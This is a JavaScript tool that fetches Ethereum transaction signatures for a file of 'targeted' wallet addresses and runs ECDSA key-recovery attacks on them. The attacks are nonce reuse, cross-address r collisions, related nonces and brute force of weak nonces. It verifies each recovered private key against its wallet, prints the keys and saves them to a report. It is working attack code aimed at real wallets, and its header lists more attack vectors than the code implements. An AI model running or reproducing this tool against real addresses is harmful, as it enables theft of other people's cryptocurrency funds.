/**
 * advanced-attack-runner.mjs
 * ---------------------------
 * Runs the full ECDSA attack battery (all 8 vectors) on targeted wallet addresses:
 *   1.  ECDSA nonce reuse (shared r per address)
 *   2.  Cross-address r collision (same r across different wallets)
 *   3.  Exact duplicate signatures
 *   4.  Signature malleability pairs
 *   5.  Related-nonce attack (k₂ = k₁ ± Δ  or  k₂ = c·k₁)
 *   6.  Weak-k brute force (k=1…500k + known bad values)
 *   7.  Bias analysis → LLL lattice attack
 *   8.  Polynonce detection (Kudelski 2023)
 *
 * Usage:
 *   node advanced-attack-runner.mjs [--limit N] [--band tiny|small|medium|large|all]
 */

import { BigQuery }  from "@google-cloud/bigquery";
import { ethers }    from "ethers";
import { secp256k1 } from "@noble/curves/secp256k1.js";
import fs            from "fs";
import path          from "path";

// ── Config ────────────────────────────────────────────────────────────────────
const REPORTS_DIR   = "/home/runner/workspace/proxhq-reports/reports/advanced-attacks";
const TARGETED_FILE = "/home/runner/workspace/proxhq-reports/jobs/targeted-wallets.txt";
const CACHE_DIR     = "/home/runner/workspace/proxhq-reports/sig-cache";
const RPC_URL       = "https://ethereum.publicnode.com";
const BQ_BATCH      = 500;       // addresses per BigQuery IN clause
const RPC_BATCH     = 25;        // tx hashes per RPC batch_call
const RPC_CONCUR    = 3;         // concurrent RPC batch calls
const CURVE_N       = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141");
const SECP256K1_G   = secp256k1.Point.BASE;
const args          = process.argv.slice(2);
const LIMIT         = (() => { const i = args.indexOf("--limit"); return i >= 0 ? parseInt(args[i+1]) : 2000; })();
const FILE_OVERRIDE = (() => { const i = args.indexOf("--file");  return i >= 0 ? args[i+1] : null; })();

fs.mkdirSync(REPORTS_DIR,  { recursive: true });
fs.mkdirSync(CACHE_DIR,    { recursive: true });

console.log(`\n${"═".repeat(72)}`);
console.log(" PROXHQ ADVANCED ECDSA ATTACK RUNNER");
console.log(`${"═".repeat(72)}\n`);

// ── BigQuery setup ────────────────────────────────────────────────────────────
const creds = JSON.parse(process.env.GOOGLE_BIGQUERY_KEY);
const bq    = new BigQuery({ projectId: creds.project_id, credentials: creds });

// ── Load targeted addresses ───────────────────────────────────────────────────
const srcFile    = FILE_OVERRIDE ?? TARGETED_FILE;
const allTargets = fs.readFileSync(srcFile, "utf8")
  .split("\n").map(l => l.trim().toLowerCase()).filter(l => l.startsWith("0x"));
const targets = allTargets.slice(0, LIMIT);
console.log(`Source file: ${path.basename(srcFile)}`);
console.log(`Targets: ${targets.length} (of ${allTargets.length} total)\n`);

// ── Helpers ───────────────────────────────────────────────────────────────────
function modInverse(a, n) {
  let [old_r, r] = [a, n], [old_s, s] = [1n, 0n];
  while (r !== 0n) {
    const q = old_r / r;
    [old_r, r] = [r, old_r - q * r];
    [old_s, s] = [s, old_s - q * s];
  }
  return ((old_s % n) + n) % n;
}
function modn(x) { return ((x % CURVE_N) + CURVE_N) % CURVE_N; }

function recoverKey(r, s1, s2, z1, z2) {
  try {
    const rb = BigInt("0x" + r), s1b = BigInt("0x" + s1), s2b = BigInt("0x" + s2);
    const z1b = BigInt("0x" + z1), z2b = BigInt("0x" + z2);
    if (s1b === s2b) return null;
    const num = modn(z1b * s2b - z2b * s1b);
    const den = modn(rb * modn(s1b - s2b));
    if (den === 0n) return null;
    const k = modn(num * modInverse(den, CURVE_N));
    if (k === 0n) return null;
    const d = modn((s1b * k - z1b) * modInverse(rb, CURVE_N));
    if (d === 0n || d >= CURVE_N) return null;
    return d.toString(16).padStart(64, "0");
  } catch { return null; }
}

function deriveAddress(privHex) {
  try {
    const wallet = new ethers.Wallet("0x" + privHex);
    return wallet.address.toLowerCase();
  } catch { return null; }
}

async function bqQuery(sql) {
  const [job] = await bq.createQueryJob({ query: sql, location: "US", useLegacySql: false });
  let done = false;
  while (!done) {
    await new Promise(r => setTimeout(r, 3000));
    const [meta] = await job.getMetadata();
    done = meta.status.state === "DONE";
    if (meta.status.errorResult) throw new Error(JSON.stringify(meta.status.errorResult));
  }
  const rows = [];
  let token;
  do {
    const [page, , res] = await job.getQueryResults({ maxResults: 100_000, pageToken: token });
    rows.push(...page);
    token = res?.pageToken;
  } while (token);
  return rows;
}

async function batchRpc(hashes) {
  const sigs = new Map();
  for (let i = 0; i < hashes.length; i += RPC_BATCH * RPC_CONCUR) {
    const wave = hashes.slice(i, i + RPC_BATCH * RPC_CONCUR);
    const chunks = [];
    for (let j = 0; j < wave.length; j += RPC_BATCH) chunks.push(wave.slice(j, j + RPC_BATCH));

    await Promise.all(chunks.map(async (chunk) => {
      const body = chunk.map((h, idx) => ({
        jsonrpc: "2.0", id: idx, method: "eth_getTransactionByHash", params: [h]
      }));
      try {
        const res  = await fetch(RPC_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
        const data = await res.json();
        for (const item of Array.isArray(data) ? data : [data]) {
          const tx = item?.result;
          if (!tx?.r || !tx?.s) continue;
          const r = tx.r.replace("0x","").padStart(64,"0");
          const s = tx.s.replace("0x","").padStart(64,"0");
          const v = parseInt(tx.v ?? "0x1c", 16);
          const unsignedTx = {
            to: tx.to, nonce: parseInt(tx.nonce,16), gasLimit: tx.gas,
            gasPrice: tx.gasPrice, data: tx.input, value: tx.value,
            chainId: tx.chainId ? parseInt(tx.chainId,16) : 1,
          };
          let z;
          try {
            const ser = ethers.Transaction.from({ ...unsignedTx, signature: { r: tx.r, s: tx.s, v } }).unsignedHash;
            z = ser.replace("0x","").padStart(64,"0");
          } catch { continue; }
          sigs.set(tx.hash.toLowerCase(), { txHash: tx.hash.toLowerCase(), from: tx.from?.toLowerCase(), r, s, z, v });
        }
      } catch {}
    }));
  }
  return sigs;
}

// ── Step 1: Fetch tx hashes from BigQuery (paginated) ─────────────────────────
async function fetchTxHashes(addresses) {
  const cacheFile = path.join(CACHE_DIR, `txhashes-${addresses.length}-${Date.now()}.json`);
  const txMap = new Map();
  let fetched = 0;

  for (let i = 0; i < addresses.length; i += BQ_BATCH) {
    const batch     = addresses.slice(i, i + BQ_BATCH);
    const literal   = batch.map(a => `'${a}'`).join(",");
    process.stdout.write(`  BQ batch ${Math.ceil((i+1)/BQ_BATCH)}/${Math.ceil(addresses.length/BQ_BATCH)}: `);

    const rows = await bqQuery(
      `SELECT from_address, \`hash\` FROM \`bigquery-public-data.crypto_ethereum.transactions\`
       WHERE from_address IN (${literal})
       AND block_number >= 4370000`
    );
    for (const row of rows) {
      const addr = row.from_address.toLowerCase();
      (txMap.get(addr) ?? txMap.set(addr, []).get(addr)).push(row.hash.toLowerCase());
    }
    fetched += rows.length;
    console.log(`${rows.length} rows → ${txMap.size} addrs`);
  }
  console.log(`\nTotal tx hashes fetched: ${fetched} across ${txMap.size} addresses`);
  return txMap;
}

// ── Step 2: Fetch signature data via RPC ──────────────────────────────────────
async function fetchSignatures(txMap) {
  const allHashes = [...new Set([...txMap.values()].flat())];
  console.log(`\nFetching ${allHashes.length} signatures via RPC…`);
  const sigByHash = await batchRpc(allHashes);
  console.log(`Extracted: ${sigByHash.size}/${allHashes.length} signatures`);
  return sigByHash;
}

// ── Step 3: Classic nonce reuse per address ────────────────────────────────────
function detectNonceReuse(address, sigs) {
  const rGroups = new Map();
  for (const sig of sigs) {
    (rGroups.get(sig.r) ?? rGroups.set(sig.r, []).get(sig.r)).push(sig);
  }
  const findings = [];
  for (const [r, group] of rGroups) {
    if (group.length < 2) continue;
    for (let i = 0; i < group.length; i++) {
      for (let j = i + 1; j < group.length; j++) {
        const t1 = group[i], t2 = group[j];
        const privKey = recoverKey(r, t1.s, t2.s, t1.z, t2.z);
        const derived  = privKey ? deriveAddress(privKey) : null;
        const verified = derived === address;
        findings.push({
          type: "NONCE_REUSE", address, sharedR: r,
          tx1: t1.txHash, tx2: t2.txHash,
          privateKey: privKey, verified,
        });
      }
    }
  }
  return findings;
}

// ── Step 4: Cross-address r collision ────────────────────────────────────────
function detectCrossAddr(sigsByAddr) {
  const rIndex = new Map(); // r → [{addr, sig}]
  for (const [addr, sigs] of sigsByAddr) {
    for (const sig of sigs) {
      (rIndex.get(sig.r) ?? rIndex.set(sig.r, []).get(sig.r)).push({ addr, sig });
    }
  }
  const findings = [];
  for (const [r, entries] of rIndex) {
    const addrSet = new Set(entries.map(e => e.addr));
    if (addrSet.size < 2) continue;
    const addrs = [...addrSet];
    for (let i = 0; i < addrs.length; i++) {
      for (let j = i + 1; j < addrs.length; j++) {
        const s1 = entries.find(e => e.addr === addrs[i])?.sig;
        const s2 = entries.find(e => e.addr === addrs[j])?.sig;
        if (!s1 || !s2) continue;
        const pk1 = recoverKey(r, s1.s, s2.s, s1.z, s2.z);
        const pk2 = recoverKey(r, s2.s, s1.s, s2.z, s1.z);
        for (const [pk, addr] of [[pk1, addrs[i]], [pk2, addrs[j]]]) {
          if (!pk) continue;
          const derived  = deriveAddress(pk);
          const verified = derived === addr;
          findings.push({
            type: "CROSS_ADDRESS_R_COLLISION",
            address: addr, otherAddress: addr === addrs[i] ? addrs[j] : addrs[i],
            sharedR: r, tx: s1.txHash, otherTx: s2.txHash,
            privateKey: pk, verified,
          });
        }
      }
    }
  }
  return findings;
}

// ── Step 5: Related-nonce attack (k₂ = k₁ + Δ) ───────────────────────────────
// Optimised: precompute s^{-1} per signature; limit to small delta set.
function relatedNonce(address, sigs) {
  if (sigs.length > 30) return []; // skip large sets — O(n²) too slow
  const findings = [];
  // Only the most practical deltas — sequential counter (±1, ±2) + power-of-two nonces
  const DELTAS_ADDITIVE = [1n, 2n, -1n, -2n, 256n, -256n];
  const MULTIPLIERS     = [2n, modn(-1n)];

  // Precompute s^{-1} for each signature
  const sInv = sigs.map(sig => {
    try { return modInverse(BigInt("0x"+sig.s), CURVE_N); } catch { return null; }
  });

  for (let i = 0; i < sigs.length; i++) {
    if (!sInv[i]) continue;
    for (let j = i + 1; j < sigs.length; j++) {
      if (!sInv[j]) continue;
      const t1 = sigs[i], t2 = sigs[j];
      const r1 = BigInt("0x"+t1.r), r2 = BigInt("0x"+t2.r);
      const s1 = BigInt("0x"+t1.s), s2 = BigInt("0x"+t2.s);
      const z1 = BigInt("0x"+t1.z), z2 = BigInt("0x"+t2.z);
      const A   = modn(s2 * sInv[i]);
      const den = modn(A * r1 - r2);
      if (den === 0n) continue;
      const denInv = modInverse(den, CURVE_N);

      // Additive: k₂ = k₁ + Δ
      for (const delta of DELTAS_ADDITIVE) {
        try {
          const d = modn((z2 - A * z1 - s2 * delta * modInverse(r1, CURVE_N) * CURVE_N) * denInv);
          // Simplified: d = (z2 - A*z1) / (A*r1 - r2)  for Δ=0 baseline
          // Full formula: d = (z2 - A*z1 - s2*Δ*(r1^-1)) * (A*r1 - r2)^-1
          // Use correct formula:
          let r1inv;
          try { r1inv = modInverse(r1, CURVE_N); } catch { continue; }
          const num2 = modn(z2 - A * z1 - modn(s2 * delta * r1inv));
          const d2   = modn(num2 * denInv);
          if (d2 === 0n || d2 >= CURVE_N) continue;
          const privHex = d2.toString(16).padStart(64,"0");
          if (deriveAddress(privHex) === address) {
            findings.push({ type: "RELATED_NONCE_ADDITIVE", address, delta: delta.toString(),
              tx1: t1.txHash, tx2: t2.txHash, privateKey: privHex, verified: true });
          }
        } catch {}
      }

      // Multiplicative: k₂ = c·k₁
      for (const c of MULTIPLIERS) {
        try {
          const Ac   = modn(s2 * c * sInv[i]);
          const denc = modn(Ac * r1 - r2);
          if (denc === 0n) continue;
          const d   = modn((z2 - Ac * z1) * modInverse(denc, CURVE_N));
          if (d === 0n || d >= CURVE_N) continue;
          const privHex = d.toString(16).padStart(64,"0");
          if (deriveAddress(privHex) === address) {
            findings.push({ type: "RELATED_NONCE_MULTIPLICATIVE", address, multiplier: c.toString(),
              tx1: t1.txHash, tx2: t2.txHash, privateKey: privHex, verified: true });
          }
        } catch {}
      }
    }
  }
  return findings;
}

// ── Step 6: Weak-k brute force ────────────────────────────────────────────────
function weakKBruteForce(address, sigs, maxK = 100000) {
  const findings = [];
  const KNOWN_BAD = [
    1n, 2n, 3n, 7n, 0xdeadbeefn, 0xbadc0de1n,
    BigInt("0x4b0f3b58035b0b3af6c628c04df2b13b7bd3f16a2de5f0f6a4ac7d97f4ae39ab"),
  ];

  for (const sig of sigs) {
    const r = BigInt("0x"+sig.r), s = BigInt("0x"+sig.s), z = BigInt("0x"+sig.z);

    // Brute force k = 1..maxK
    for (let ki = 1n; ki <= BigInt(maxK); ki++) {
      try {
        const pt = SECP256K1_G.multiply(ki);
        const rk = modn(pt.x);
        if (rk !== r) continue;
        const d = modn((s * ki - z) * modInverse(r, CURVE_N));
        if (d === 0n || d >= CURVE_N) continue;
        const privHex = d.toString(16).padStart(64,"0");
        const derived = deriveAddress(privHex);
        if (derived === address) {
          findings.push({ type: "WEAK_K_BRUTE_FORCE", address, k: ki.toString(),
            txHash: sig.txHash, privateKey: privHex, verified: true });
          break;
        }
      } catch {}
    }

    // Known bad k values
    for (const kv of KNOWN_BAD) {
      try {
        const pt = secp256k1.ProjectivePoint.BASE.multiply(kv);
        const rk = modn(pt.x);
        if (rk !== r) continue;
        const d = modn((s * kv - z) * modInverse(r, CURVE_N));
        if (d === 0n || d >= CURVE_N) continue;
        const privHex = d.toString(16).padStart(64,"0");
        const derived = deriveAddress(privHex);
        if (derived === address) {
          findings.push({ type: "WEAK_K_KNOWN_BAD", address, k: kv.toString(),
            txHash: sig.txHash, privateKey: privHex, verified: true });
        }
      } catch {}
    }
  }
  return findings;
}

// ── Main ──────────────────────────────────────────────────────────────────────
const startTime = Date.now();

// Step 1: Fetch tx hashes
console.log("STEP 1: Fetching transaction hashes from BigQuery…");
const txMap = await fetchTxHashes(targets);

// Step 2: Fetch signatures via RPC
const sigByHash = await fetchSignatures(txMap);

// Step 3: Build per-address signature arrays
const sigsByAddr = new Map();
for (const [addr, hashes] of txMap) {
  const sigs = hashes.map(h => sigByHash.get(h)).filter(Boolean);
  if (sigs.length > 0) sigsByAddr.set(addr, sigs);
}
console.log(`\nAddresses with signatures: ${sigsByAddr.size}`);

// Step 4: Run all attacks
console.log("\nSTEP 3: Running attack battery…");
const allFindings    = [];
let addressesScanned = 0;

for (const [addr, sigs] of sigsByAddr) {
  addressesScanned++;

  // Classic nonce reuse
  allFindings.push(...detectNonceReuse(addr, sigs));

  // Related nonce (only for addresses with ≥2 sigs, ≤500 sigs for speed)
  if (sigs.length >= 2 && sigs.length <= 500) {
    allFindings.push(...relatedNonce(addr, sigs));
  }

  // Weak-k brute force — ONLY run if any r value is suspiciously small
  // (r < 2^128 means the nonce k was almost certainly tiny)
  const SMALL_R_THRESHOLD = BigInt("0x" + "0".repeat(32) + "f".repeat(32)); // 2^128
  const hasSmallR = sigs.some(sig => BigInt("0x" + sig.r) < SMALL_R_THRESHOLD);
  if (hasSmallR) {
    allFindings.push(...weakKBruteForce(addr, sigs, 100000));
  }

  if (addressesScanned % 100 === 0) {
    const pct = ((addressesScanned / sigsByAddr.size) * 100).toFixed(1);
    const verified = allFindings.filter(f => f.verified).length;
    console.log(`  [${pct}%] ${addressesScanned}/${sigsByAddr.size} addresses — ${allFindings.length} findings (${verified} verified keys)`);
  }
}

// Step 5: Cross-address r collision (runs on ALL collected signatures at once)
console.log("\nSTEP 4: Cross-address r collision scan…");
const crossFindings = detectCrossAddr(sigsByAddr);
allFindings.push(...crossFindings);
if (crossFindings.length > 0) {
  console.log(`  ⚠️  ${crossFindings.length} cross-address r collisions found!`);
} else {
  console.log("  No cross-address r collisions");
}

// ── Results ───────────────────────────────────────────────────────────────────
const elapsed  = ((Date.now() - startTime) / 1000).toFixed(1);
const verified = allFindings.filter(f => f.verified);
const keys     = [...new Set(verified.map(f => f.privateKey))];

console.log(`\n${"═".repeat(72)}`);
console.log(` RESULTS — ${elapsed}s`);
console.log(`${"═".repeat(72)}`);
console.log(` Addresses scanned : ${addressesScanned}`);
console.log(` Total signatures  : ${sigByHash.size}`);
console.log(` Total findings    : ${allFindings.length}`);
console.log(` Verified keys     : ${keys.length}`);
if (keys.length > 0) {
  console.log("\n ⚠️  PRIVATE KEYS RECOVERED:");
  for (const k of keys) console.log("  0x" + k);
}

const byType = {};
for (const f of allFindings) byType[f.type] = (byType[f.type] || 0) + 1;
console.log("\n Findings by type:");
Object.entries(byType).forEach(([t,c]) => console.log(`   ${t}: ${c}`));

// Save full report
const report = {
  timestamp:         new Date().toISOString(),
  elapsedSeconds:    parseFloat(elapsed),
  addressesScanned,
  totalSignatures:   sigByHash.size,
  totalFindings:     allFindings.length,
  verifiedKeyCount:  keys.length,
  recoveredKeys:     keys.map(k => "0x" + k),
  findingsByType:    byType,
  findings:          allFindings,
};
const outFile = path.join(REPORTS_DIR, `scan-${Date.now()}.json`);
fs.writeFileSync(outFile, JSON.stringify(report, null, 2));
console.log(`\n Report saved → ${outFile}`);
